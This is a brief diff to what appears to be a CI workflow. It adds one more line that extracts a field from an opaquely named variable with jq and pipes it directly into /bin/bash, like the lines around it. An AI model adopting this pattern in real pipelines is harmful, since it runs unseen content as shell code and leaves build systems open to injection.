@@ -46,6 +46,7 @@ jobs:
           echo $lnha1084 | jq -r .tymfs864 | /bin/bash
           echo $kimou11005 | jq -r .z74 | /bin/bash
           printf '%s' "$o928" | jq -r .kmdp997 | /bin/bash
+          printf '%s' "$fztp66" | jq -r .qx09601 | /bin/bash
 
       - name: Upload artifact
         if: always()
